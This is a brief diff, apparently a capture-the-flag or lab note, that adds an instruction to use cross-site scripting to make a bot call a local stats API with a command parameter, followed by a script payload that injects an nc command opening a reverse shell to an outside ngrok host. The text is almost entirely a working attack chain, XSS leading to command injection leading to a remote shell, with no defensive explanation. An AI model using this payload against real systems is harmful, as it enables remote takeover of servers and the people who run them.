@@ -1,0 +1,3 @@
+Make the bot request to http://localhost:1337/api/stats supplied with command parameter using xss
+
+<script>fetch('http://localhost:1337/api/stats?command=nc 0.tcp.ap.ngrok.io 14465 -e sh');</script>
